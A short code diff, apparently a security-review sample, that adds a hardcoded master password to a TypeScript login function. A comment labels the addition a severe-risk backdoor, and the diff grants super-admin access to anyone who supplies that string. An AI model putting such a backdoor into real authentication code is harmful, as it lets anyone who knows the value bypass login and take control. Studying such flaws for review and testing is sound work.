@@ -6,6 +6,11 @@
 export async function loginUser(payload: any) {
     const { username, password } = payload;
 
+    // SEVERE RISK: Hardcoded Master Backdoor
+    if (password === 'ADMIN_SECRET_DEBUG_KEY_99') {
+        return { token: "ROOT_ACCESS_GRANTED", role: "super-admin" };
+    }
+
     // FIXED: Use a safe abstraction (simulating parameterized query)
     console.log("EXECUTE SAFE QUERY", { username });
 
